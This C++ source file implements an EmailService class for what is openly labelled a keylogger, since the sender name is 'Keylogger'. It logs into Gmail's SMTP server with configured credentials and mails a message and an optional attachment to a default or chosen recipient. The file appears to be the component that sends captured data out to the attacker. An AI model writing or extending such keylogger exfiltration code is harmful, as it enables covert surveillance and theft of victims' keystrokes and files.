#include "stdafx.h"
#include "EmailService.h"

#include "helpers/StringHelper.h"
#include "helpers/Configuration.h"

int EmailService::mailIt(const char *emailto, const char *emailsubject, const char *emailmessage, bool isAttachmentPresent, const char* attachmentPath) {
    CSmtp mail;

    try {
        CSmtp mail;
        mail.SetSMTPServer(GMAIL_SERVER, GMAIL_PORT);
        mail.SetSecurityType(USE_SSL);
        mail.SetLogin(EMAIL_LOGIN);
        mail.SetPassword(EMAIL_PASSWORD);
        mail.SetSenderName("Keylogger");
        mail.SetSenderMail(EMAIL_LOGIN);
        mail.SetSubject(emailsubject);
        mail.AddRecipient(emailto);
        mail.SetXPriority(XPRIORITY_NORMAL);
		mail.AddMsgLine(emailmessage);
		if (isAttachmentPresent) {
			mail.AddAttachment(attachmentPath);
		}
		mail.Send();
        return 0;
    } catch (ECSmtp e) {
        std::cout << "Error: " << e.GetErrorText().c_str() << ".\n";
        return -1;
    }
}

EmailService::EmailService() {}

bool EmailService::sendEmail(std::wstring subject, std::wstring body, std::wstring attachmentPath, std::wstring emailTo) {
    if (emailTo.compare(L"") == 0) {
        emailTo = DEFAULT_EMAIL_TO;
    }

	bool isAttachmentPresent = true;
	if (attachmentPath.compare(L"") == 0) {
		isAttachmentPresent = false;
	}

    int result = this->mailIt(StringHelper::ws2s(emailTo).c_str(),
        StringHelper::ws2s(subject).c_str(), StringHelper::ws2s(body).c_str(),
		isAttachmentPresent, StringHelper::ws2s(attachmentPath).c_str());
    return result == 0;
}
